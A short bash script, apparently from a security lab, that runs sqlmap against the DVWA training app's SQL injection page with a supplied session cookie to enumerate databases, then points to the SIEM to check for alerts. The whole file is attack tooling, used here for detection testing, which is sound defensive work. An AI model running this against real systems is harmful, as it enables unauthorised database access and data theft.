
##  attack-scripts/sqli_test.sh
```bash
#!/bin/bash
# SQL Injection Simulation using sqlmap
# Usage: ./sqli_test.sh <target-ip> <cookie>

TARGET=$1
COOKIE=$2

if [ -z "$TARGET" ]; then
  echo "Usage: ./sqli_test.sh <target-ip> <session-cookie>"
  exit 1
fi

echo "[*] Starting SQL Injection test on $TARGET"

sqlmap -u "http://$TARGET/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=$COOKIE; security=low" \
  --dbs \
  --batch \
  --level=3 \
  --risk=2

echo "[+] Done. Check SIEM for SQLi alerts."
```

